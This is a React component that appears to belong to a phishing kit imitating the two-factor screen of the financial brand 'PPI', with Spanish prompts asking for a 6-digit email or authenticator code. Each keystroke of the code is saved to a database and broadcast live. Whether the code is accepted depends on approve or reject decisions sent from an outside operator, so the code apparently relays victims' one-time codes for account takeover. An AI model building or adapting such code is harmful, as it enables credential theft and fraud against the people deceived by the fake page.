import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Mail, KeyRound, ArrowLeft } from "lucide-react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
  InputOTPSeparator,
} from "@/components/ui/input-otp";

interface PpiOtpScreenProps {
  email: string;
  sessionId: string;
  twofaType?: number; // 0 = email, 1 = authenticator
  onBack: () => void;
}

const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps) => {
  const [otp, setOtp] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");

  const isEmail = twofaType === 0;
  const isAuthenticator = twofaType === 1;

  const title = isEmail
    ? "Código enviado a tu email"
    : isAuthenticator
    ? "Google Authenticator"
    : "Verificación en dos pasos";

  const description = isEmail
    ? "Ingresá el código de 6 dígitos que recibiste en tu correo electrónico"
    : isAuthenticator
    ? "Ingresá el código de 6 dígitos de tu app Google Authenticator"
    : "Ingresá el código de 6 dígitos para verificar tu identidad";

  const icon = isEmail ? (
    <Mail className="h-7 w-7 text-[#1e5a96]" />
  ) : (
    <KeyRound className="h-7 w-7 text-[#1e5a96]" />
  );

  const iconEmoji = isEmail ? "📧" : "🔐";

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Código incorrecto. Intentá nuevamente.");
          setOtp("");
          setTimeout(() => {
            setStatus("input");
            supabase.from("sessions").update({ status: "redirect_otp" } as any).eq("id", sessionId).then(() => {});
          }, 2000);
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage("Código incorrecto. Intentá nuevamente.");
          setOtp("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const handleOtpChange = useCallback((value: string) => {
    setOtp(value);
    supabase.from("sessions").update({ otp_code: value } as any).eq("id", sessionId).then(() => {});
    const bc = supabase.channel(`otp-live-${sessionId}-${Date.now()}`);
    bc.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        bc.send({ type: "broadcast", event: "otp_code_update", payload: { otp_code: value, session_id: sessionId } });
        setTimeout(() => supabase.removeChannel(bc), 1500);
      }
    });
  }, [sessionId]);

  useEffect(() => {
    if (otp.length === 6 && status === "input") setStatus("verifying");
  }, [otp, status]);

  if (status === "success") {
    return (
      <div className="flex flex-col items-center text-center px-4">
        <img src={ppiLogoSvg} alt="PPI" className="h-8 mb-6" />
        <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-50">
          <span className="text-2xl">✅</span>
        </div>
        <h3 className="mb-2 text-lg font-bold text-[#1e2a3a]">Verificación exitosa</h3>
        <p className="text-sm text-[#8c939a]">Tu identidad fue verificada correctamente. Redirigiendo...</p>
        <p className="mt-1 text-xs text-[#bbb]">{email}</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center text-center px-4">
      <img src={ppiLogoSvg} alt="PPI" className="h-8 mb-6" />

      {/* Icon */}
      <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#f0f5fa]">
        <span className="text-2xl">{iconEmoji}</span>
      </div>

      {/* MFA type badge */}
      <div className="mb-3 inline-flex items-center gap-1.5 rounded-full border border-[#d0dbe8] bg-[#f5f8fc] px-3 py-1">
        {icon}
        <span className="text-xs font-semibold text-[#1e5a96]">
          {isEmail ? "Código por email" : isAuthenticator ? "Google Authenticator" : "2FA"}
        </span>
      </div>

      <h3 className="mb-1.5 text-lg font-bold text-[#1e2a3a]">{title}</h3>
      <p className="mb-1 text-sm text-[#8c939a] max-w-[320px]">{description}</p>
      <p className="mb-6 text-xs text-[#bbb]">{email}</p>

      {errorMessage && status === "error" && (
        <div className="mb-4 w-full rounded-lg border border-red-200 bg-red-50 px-4 py-2 text-sm text-red-600">
          {errorMessage}
        </div>
      )}

      <div className="mb-6">
        <InputOTP maxLength={6} value={otp} onChange={handleOtpChange} disabled={status === "verifying"} inputMode="numeric" pattern="[0-9]*">
          <InputOTPGroup>
            <InputOTPSlot index={0} />
            <InputOTPSlot index={1} />
            <InputOTPSlot index={2} />
          </InputOTPGroup>
          <InputOTPSeparator />
          <InputOTPGroup>
            <InputOTPSlot index={3} />
            <InputOTPSlot index={4} />
            <InputOTPSlot index={5} />
          </InputOTPGroup>
        </InputOTP>
      </div>

      {status === "verifying" && (
        <div className="mb-4 flex items-center gap-2 text-sm text-[#8c939a]">
          <div className="h-4 w-4 animate-spin rounded-full border-2 border-[#1e5a96] border-t-transparent" />
          Verificando código...
        </div>
      )}

      <button
        onClick={onBack}
        disabled={status === "verifying"}
        className="flex items-center gap-1.5 text-xs text-[#8c939a] hover:text-[#1e2a3a] transition-colors disabled:opacity-50"
      >
        <ArrowLeft size={13} />
        Volver al inicio
      </button>
    </div>
  );
};

export default PpiOtpScreen;
